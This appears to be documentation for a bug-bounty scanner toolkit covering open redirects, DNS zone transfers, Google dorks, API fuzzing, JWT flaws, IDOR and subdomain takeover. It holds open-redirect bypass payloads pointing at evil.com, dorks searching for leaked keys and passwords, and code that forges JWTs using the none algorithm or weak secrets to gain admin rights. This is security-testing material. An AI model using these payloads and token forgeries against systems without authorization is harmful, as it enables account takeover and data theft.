# 🔍 Additional Scanner Modules

Deep dive into specialized vulnerability scanners.

---

## 📄 src/open_redirect.py - Open Redirect Finder

### Overview

```python
"""
Open Redirect Finder Module

WHY OPEN REDIRECTS?
Open redirects allow attackers to:
- Phishing (victim sees trusted domain in URL)
- OAuth token theft
- SSRF chain attacks
- Bypass security filters

Usually MEDIUM severity, but can be HIGH if chained.
"""
```

**How open redirect works:**
```
Normal: https://target.com/redirect?url=https://target.com/dashboard
Attack: https://target.com/redirect?url=https://evil.com
```
Victim sees trusted domain, clicks, ends up on attacker's site.

---

### Redirect Parameters

```python
self.redirect_params = [
    'url', 'redirect', 'redirect_url', 'redirect_uri', 'redirectUrl',
    'return', 'return_url', 'returnUrl', 'return_to', 'returnTo',
    'next', 'next_url', 'nextUrl', 'goto', 'go', 'to',
    'dest', 'destination', 'target', 'link', 'linkurl',
    'continue', 'continueTo', 'forward', 'forwardTo',
    'out', 'outurl', 'checkout_url', 'logout', 'login',
]
```

**Why these parameters?**
- Common naming conventions for redirects
- OAuth flows use `redirect_uri`
- Login/logout use `return`, `next`
- Link trackers use `url`, `out`

---

### Bypass Payloads

```python
self.payloads = [
    'https://evil.com',           # Basic
    '//evil.com',                 # Protocol-relative
    '/\\evil.com',                # Backslash bypass
    '////evil.com',               # Multiple slashes
    '//evil.com/%2f..',           # Path traversal
    '\\\\evil.com',               # Double backslash
    'https://evil.com#',          # Fragment
    'https://evil.com?',          # Query string
    '//evil%00.com',              # Null byte
    '//google.com%2f@evil.com',   # @ bypass
    'https://expected.com@evil.com',  # Credential bypass
]
```

**Bypass techniques explained:**

| Payload | Bypasses |
|---------|----------|
| `//evil.com` | Filters checking for `http://` |
| `/\evil.com` | Backslash interpreted as forward slash |
| `////evil.com` | Multiple slash normalization |
| `@evil.com` | URL credential syntax abuse |
| `%2f` | URL-encoded slash |

---

### Detection Logic

```python
async def check_redirect(self, session, url, param, payload):
    # Don't follow redirects - we want to see the Location header
    async with session.get(test_url, allow_redirects=False) as resp:
        
        # Check for redirect status codes
        if resp.status in [301, 302, 303, 307, 308]:
            location = resp.headers.get('Location', '')
            
            # Check if redirect goes to our payload
            if 'evil.com' in location.lower():
                return {'vulnerable': True, 'type': 'header_redirect'}
        
        # Also check for JS/meta redirects in body
        if resp.status == 200:
            body = await resp.text()
            if 'evil.com' in body.lower():
                if 'window.location' in body.lower():
                    return {'vulnerable': True, 'type': 'javascript_redirect'}
                if 'meta' in body.lower() and 'refresh' in body.lower():
                    return {'vulnerable': True, 'type': 'meta_refresh'}
```

**Three redirect types:**
1. **Header redirect:** `Location: https://evil.com` (most common)
2. **JavaScript:** `window.location = "https://evil.com"`
3. **Meta refresh:** `<meta http-equiv="refresh" content="0;url=https://evil.com">`

---

## 📄 src/dns_analyzer.py - DNS Security Analysis

### Overview

```python
"""
DNS Analysis Module

WHY DNS ANALYSIS?
DNS misconfigurations can leak:
- Internal hostnames via zone transfer
- Email security issues (SPF/DMARC)
- Infrastructure information
- Hidden subdomains

Zone transfer is a jackpot - ALL DNS records exposed.
"""
```

---

### Zone Transfer (AXFR)

```python
def attempt_zone_transfer(self, domain, nameserver):
    # Get nameserver IP
    ns_ip = str(self.resolver.resolve(nameserver, 'A')[0])
    
    # Attempt zone transfer
    zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=10))
    
    for name, node in zone.nodes.items():
        for rdataset in node.rdatasets:
            for rdata in rdataset:
                records.append({
                    'name': str(name),
                    'type': dns.rdatatype.to_text(rdataset.rdtype),
                    'value': str(rdata)
                })
```

**What is zone transfer?**
- DNS servers sync records via AXFR
- Should only work between authorized servers
- Misconfigured = anyone can dump ALL records

**Why it's critical:**
- Reveals ALL subdomains
- Internal hostnames exposed
- Infrastructure mapping
- Usually HIGH severity finding

---

### SPF Analysis

```python
def analyze_spf(self, txt_records):
    for record in txt_records:
        if record.startswith('v=spf1'):
            # Check for issues
            if '+all' in record:
                # CRITICAL: Anyone can send email as this domain
                issues.append({'severity': 'HIGH', 'issue': 'SPF allows all senders'})
            elif '~all' in record:
                # MEDIUM: Soft fail, emails might be delivered
                issues.append({'severity': 'MEDIUM', 'issue': 'SPF uses soft fail'})
```

**SPF mechanisms:**

| Mechanism | Meaning | Security |
|-----------|---------|----------|
| `-all` | Hard fail | ✅ Good |
| `~all` | Soft fail | ⚠️ Weak |
| `?all` | Neutral | ❌ Bad |
| `+all` | Pass all | 🚨 Critical |

---

### DMARC Analysis

```python
def analyze_dmarc(self, domain):
    dmarc_domain = f"_dmarc.{domain}"
    answers = self.resolver.resolve(dmarc_domain, 'TXT')
    
    for rdata in answers:
        record = str(rdata)
        if record.startswith('v=DMARC1'):
            if 'p=none' in record:
                # No enforcement - emails not rejected
                issues.append({'severity': 'MEDIUM', 'issue': 'DMARC policy is none'})
```

**DMARC policies:**

| Policy | Action | Security |
|--------|--------|----------|
| `p=reject` | Reject failed | ✅ Best |
| `p=quarantine` | Spam folder | ⚠️ OK |
| `p=none` | No action | ❌ Weak |

---

## 📄 src/google_dorker.py - Google Dork Generator

### Overview

```python
"""
Google Dorking Module

WHY GOOGLE DORKING?
Google indexes EVERYTHING. Companies accidentally expose:
- Internal documents
- Config files with credentials
- Backup files
- Admin panels
- Error pages revealing stack traces
"""
```

**Note:** This generates queries, doesn't execute them (Google blocks automation).

---

### Dork Categories

```python
self.dorks = {
    'sensitive_files': [
        'site:{target} filetype:pdf',
        'site:{target} filetype:sql',
        'site:{target} filetype:env',
        'site:{target} filetype:bak',
    ],
    'config_files': [
        'site:{target} inurl:config',
        'site:{target} "DB_PASSWORD"',
        'site:{target} ext:yml OR ext:yaml',
    ],
    'admin_panels': [
        'site:{target} inurl:admin',
        'site:{target} inurl:wp-admin',
        'site:{target} inurl:phpmyadmin',
    ],
    'error_messages': [
        'site:{target} "sql syntax" OR "mysql error"',
        'site:{target} "stack trace"',
        'site:{target} "DEBUG = True"',
    ],
    'sensitive_info': [
        'site:{target} "api_key" OR "apikey"',
        'site:{target} "AWS_ACCESS_KEY"',
        'site:{target} "BEGIN RSA PRIVATE KEY"',
    ],
}
```

**Google operators:**

| Operator | Purpose | Example |
|----------|---------|---------|
| `site:` | Limit to domain | `site:target.com` |
| `filetype:` | File extension | `filetype:pdf` |
| `inurl:` | URL contains | `inurl:admin` |
| `intitle:` | Page title | `intitle:"index of"` |
| `ext:` | File extension | `ext:sql` |

---

## 📄 src/api_fuzzer.py - API Endpoint Discovery

### Overview

```python
"""
API Endpoint Fuzzer Module

WHY API FUZZING?
APIs are often less protected than web interfaces:
- Undocumented endpoints with sensitive data
- Debug/admin endpoints left exposed
- Missing authentication on internal APIs
"""
```

---

### API Path Wordlists

```python
self.api_paths = {
    'common': [
        '/api', '/api/v1', '/api/v2', '/api/v3',
        '/graphql', '/graphiql', '/playground',
        '/swagger', '/swagger-ui', '/swagger.json',
        '/health', '/healthz', '/status', '/metrics',
    ],
    'auth': [
        '/api/auth', '/api/login', '/api/token',
        '/oauth/token', '/api/users/me',
    ],
    'admin': [
        '/api/admin', '/api/internal', '/api/debug',
        '/api/config', '/api/logs',
    ],
    'data': [
        '/api/users', '/api/export', '/api/backup',
        '/api/dump', '/api/download',
    ],
}
```

**Why these paths?**
- REST API conventions
- Common framework defaults
- Debug endpoints often forgotten
- Health checks reveal info

---

### GraphQL Introspection

```python
self.graphql_introspection = '''
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        types { name kind description }
    }
}
'''

async def test_graphql(self, session, base_url):
    # Test GET with query param
    async with session.get(f"{url}?query={{__schema{{types{{name}}}}}}") as resp:
        if '__schema' in await resp.text():
            return {'introspection_enabled': True}
    
    # Test POST
    async with session.post(url, json={'query': self.graphql_introspection}) as resp:
        if '__schema' in await resp.text():
            return {'introspection_enabled': True}
```

**Why GraphQL introspection matters:**
- Reveals entire API schema
- All queries, mutations, types
- Should be disabled in production
- Easy to find sensitive operations

---

### Response Analysis

```python
self.interesting_patterns = {
    'api_info': [r'"version":', r'"swagger":', r'"openapi":'],
    'auth_bypass': [r'"authenticated":\s*true', r'"admin":\s*true'],
    'data_leak': [r'"email":', r'"password":', r'"api_key":'],
    'debug_info': [r'"debug":', r'"stack_trace":', r'"exception":'],
}
```

**What we look for:**
- API documentation (swagger, openapi)
- Authentication state in response
- Sensitive data exposure
- Debug information leaks

---

## 📄 src/jwt_analyzer.py - JWT Security Analysis

### Overview

```python
"""
JWT Analyzer

Common vulnerabilities:
- Algorithm confusion: Change RS256 to HS256, sign with public key
- None algorithm: Remove signature entirely
- Weak secrets: Brute-force common passwords
- No expiration check: Use expired tokens forever

Auth bypass via JWT = $5k-$20k bounties.
"""
```

---

### JWT Structure

```python
def decode_jwt(self, token):
    parts = token.split('.')  # header.payload.signature
    
    # Decode header (base64)
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    # Example: {"alg": "HS256", "typ": "JWT"}
    
    # Decode payload (base64)
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    # Example: {"user_id": 123, "admin": false, "exp": 1234567890}
    
    return {'header': header, 'payload': payload, 'signature': parts[2]}
```

**JWT format:** `base64(header).base64(payload).signature`

---

### None Algorithm Attack

```python
def create_none_token(self, decoded):
    header = {'alg': 'none', 'typ': 'JWT'}  # No signature required!
    payload = decoded['payload']
    
    header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode())
    payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode())
    
    return f"{header_b64}.{payload_b64}."  # Empty signature!
```

**How it works:**
1. Change algorithm to "none"
2. Remove signature
3. Server accepts unsigned token
4. Full authentication bypass

---

### Weak Secret Testing

```python
self.weak_secrets = [
    'secret', 'password', '123456', 'admin', 'key',
    'jwt_secret', 'your-256-bit-secret', 'changeme',
    '', ' ', 'null', 'undefined', 'none',
]

async def test_weak_secrets(self, decoded, original_token):
    for secret in self.weak_secrets:
        test_token = self.create_hs256_token(decoded, secret)
        # Compare signatures
        if test_token.split('.')[2] == original_token.split('.')[2]:
            return {'secret': secret, 'severity': 'critical'}
```

**Why test weak secrets?**
- Developers use simple secrets
- If we find the secret, we can forge any token
- Create admin tokens, impersonate users

---

### Privilege Escalation Token

```python
def create_modified_token(self, decoded, modifications, secret=None):
    new_payload = decoded['payload'].copy()
    new_payload.update(modifications)  # {'admin': True, 'role': 'admin'}
    
    if secret:
        return self.create_hs256_token(modified, secret)
    return self.create_none_token(modified)
```

**Attack flow:**
1. Decode your JWT
2. Change `admin: false` → `admin: true`
3. Re-sign with weak secret or none algorithm
4. Access admin functionality

---

## 📄 src/idor_scanner.py - IDOR / Access Control Scanner

### Overview

```python
"""
IDOR (Insecure Direct Object Reference) Scanner

IDOR is the #1 most common vulnerability in bug bounties:
- Access other users' data by changing IDs
- View/modify resources you shouldn't access
- Easy to find, high impact

Consistent $500-$5000 payouts.
"""
```

---

### Vulnerable Parameters

```python
self.idor_params = [
    'id', 'user_id', 'userId', 'uid', 'account_id',
    'order_id', 'invoice_id', 'doc_id', 'file_id',
    'report_id', 'ticket_id', 'message_id', 'comment_id',
    'product_id', 'customer_id', 'project_id', 'task_id',
]
```

**Common IDOR patterns:**
- `/api/user/123` → `/api/user/124`
- `/order?id=1000` → `/order?id=1001`
- `/download?file_id=abc` → `/download?file_id=def`

---

### ID Extraction

```python
self.path_patterns = [
    r'/users?/(\d+)',           # /user/123 or /users/123
    r'/accounts?/(\d+)',        # /account/456
    r'/api/v\d+/\w+/(\d+)',     # /api/v1/orders/789
    r'/(\d+)/?$',               # Trailing ID
    # UUID pattern
    r'/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})',
]

def extract_ids_from_url(self, url):
    # Check path for IDs
    for pattern in self.path_patterns:
        matches = re.findall(pattern, url)
        # Found ID in path
    
    # Check query parameters
    query_params = parse_qs(parsed.query)
    for param, values in query_params.items():
        if param.lower() in self.idor_params:
            # Found ID in parameter
```

---

### Test ID Generation

```python
def generate_test_ids(self, original_id, id_type):
    if id_type == 'numeric':
        orig_int = int(original_id)
        test_values = [
            str(orig_int - 1),  # Previous ID
            str(orig_int + 1),  # Next ID
            '1', '2', '0', '-1',  # Common IDs
            str(orig_int * 2),  # Double
        ]
    
    elif id_type == 'uuid':
        # Modify last few characters
        test_values = [
            original_id[:-4] + '0000',
            original_id[:-4] + 'ffff',
        ]
    
    # Also test special values
    test_values.extend(['null', 'undefined', 'NaN'])
```

**Why these test IDs?**
- Adjacent IDs often belong to other users
- ID 1 is often admin
- Special values might cause errors

---

### IDOR Detection

```python
async def test_idor(self, session, original_url, test_url, baseline, id_info, test_id):
    async with session.get(test_url) as resp:
        content = await resp.text()
        
        # Same status, different content = potential IDOR
        if resp.status == 200 and baseline['status'] == 200:
            if len(content) != baseline['length']:
                return {'vulnerable': True, 'severity': 'high',
                        'reason': 'Different content for different ID'}
        
        # Got 200 when baseline was 403 = access control bypass
        if resp.status == 200 and baseline['status'] in [401, 403]:
            return {'vulnerable': True, 'severity': 'critical',
                    'reason': 'Access control bypass'}
        
        # Check for sensitive data patterns
        if re.search(r'"email":|"password":', content):
            return {'vulnerable': True, 'severity': 'high',
                    'reason': 'Sensitive data exposed'}
```

**Detection logic:**
1. **Baseline:** Get response for original ID
2. **Test:** Request with different ID
3. **Compare:** Different content = different user's data
4. **Bypass:** 200 instead of 403 = access control failure

---

## 📄 src/subdomain_takeover.py - Subdomain Takeover Checker

### Overview

```python
"""
Subdomain Takeover Checker

How it works:
1. Company creates blog.target.com → points to Heroku
2. Company cancels Heroku but forgets DNS record
3. Attacker claims the Heroku app name
4. Attacker now controls blog.target.com!

Usually HIGH/CRITICAL severity.
"""
```

---

### Service Fingerprints

```python
self.fingerprints = {
    's3': {
        'cnames': ['.s3.amazonaws.com', '.s3-website'],
        'fingerprints': ['NoSuchBucket', 'The specified bucket does not exist'],
        'service': 'AWS S3'
    },
    'heroku': {
        'cnames': ['.herokuapp.com', '.herokudns.com'],
        'fingerprints': ['No such app', "There's nothing here, yet"],
        'service': 'Heroku'
    },
    'github': {
        'cnames': ['.github.io'],
        'fingerprints': ["There isn't a GitHub Pages site here"],
        'service': 'GitHub Pages'
    },
    'shopify': {
        'cnames': ['.myshopify.com'],
        'fingerprints': ['Sorry, this shop is currently unavailable'],
        'service': 'Shopify'
    },
    ...
}
```

**Detection process:**
1. Get CNAME record for subdomain
2. Match CNAME against known services
3. Check response for "unclaimed" fingerprint
4. If fingerprint matches = VULNERABLE

---

### Takeover Check

```python
async def check_subdomain(self, session, subdomain):
    # Get CNAME
    cname = await self.get_cname(subdomain)
    
    # Check against fingerprints
    for service_id, service_info in self.fingerprints.items():
        for cname_pattern in service_info['cnames']:
            if cname_pattern in cname.lower():
                # CNAME matches service, check response
                if await self.check_response(session, url, service_info['fingerprints']):
                    return {
                        'subdomain': subdomain,
                        'cname': cname,
                        'service': service_info['service'],
                        'vulnerable': True,
                        'severity': 'HIGH'
                    }
```

**Why this is critical:**
- Attacker controls your subdomain
- Can host phishing pages
- Steal cookies (same-origin)
- Damage reputation

---

## 🎯 Scanner Comparison

| Scanner | Finds | Severity | Bounty Range |
|---------|-------|----------|--------------|
| Open Redirect | URL redirects | Medium | $100-$500 |
| DNS Analyzer | Zone transfer, SPF | High | $500-$2000 |
| API Fuzzer | Hidden endpoints | Varies | $200-$5000 |
| JWT Analyzer | Auth bypass | Critical | $5k-$20k |
| IDOR Scanner | Access control | High | $500-$5000 |
| Subdomain Takeover | Domain control | Critical | $1k-$10k |

